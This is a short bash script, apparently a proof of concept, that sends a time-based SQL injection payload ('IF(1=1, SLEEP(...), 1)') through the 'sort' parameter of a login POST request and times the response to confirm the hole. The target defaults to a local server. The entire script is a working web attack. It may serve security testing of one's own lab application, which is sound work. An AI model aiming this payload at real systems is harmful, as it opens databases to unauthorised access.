#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${BASE_URL:-http://127.0.0.1:5000}"
DELAY="${DELAY:-3}"

payload="created_at, IF(1=1, SLEEP(${DELAY}), 1)"

printf "Triggering time-based SQLi delay (%ss)...\n" "$DELAY"

curl -s -o /dev/null -w "Response time: %{time_total}s\n" \
  -X POST "$BASE_URL/login" \
  -d "username=invalid" \
  -d "password=invalid" \
  --data-urlencode "sort=$payload"
